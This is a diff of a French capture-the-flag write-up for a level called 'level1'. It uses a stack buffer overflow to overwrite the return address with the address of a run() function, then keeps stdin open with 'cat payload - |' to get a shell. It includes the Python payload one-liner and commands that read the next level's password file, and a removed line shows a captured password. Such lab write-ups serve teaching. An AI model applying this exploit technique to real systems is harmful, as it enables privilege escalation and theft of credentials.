@@ -42,6 +42,7 @@ Ce qui est une technique courante pour lancer un shell interactif.
   0x8048584:	 "/bin/sh"
   ```
 
+
 ## Résolution
 - On va overflow la valeur de la commande `ret` avec l'adresse de la fonction `run()` pour que quand la 
 commande `ret()` sera execute, c'est `run()` qui sera appelee et donc notre appel systeme sera execute
@@ -67,16 +68,14 @@ $ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
 Segmentation fault (core dumped)
 ```
-- Le shell exit car son process parent exit. Du coup il faut modifier le code pour fait un cat du mot
-de passe avant que le shell ne se ferme. Cela donne : 
+- Le shell a bien ete ouvert mais il exit car son process parent exit. Il existe un moyen de laisser stdin open (en utilisant `- |`). On va donc inscrire le payload dans un fichier, puis faire un `cat` de ce fichier en utilisant notre trick : 
 ```shell
-$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; echo "cat /home/user/level2/.pass") | ./level1
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
+cat /tmp/payload - | ./level1
 Good... Wait what?
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-Segmentation fault (core dumped)
 ```
-
-Il ne reste plus qu'à :
-- et passer au level2 (`su level2`) en renseignant le password obtenu plus haut.
-
-
+- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level2`.
+- Il ne reste plus qu'à :
+  - récupérer le password (`cat /home/user/level2/.pass`)
+  - quitter le shell (`exit`)
+  - et passer au level2 (`su level2`) en renseignant ce password.
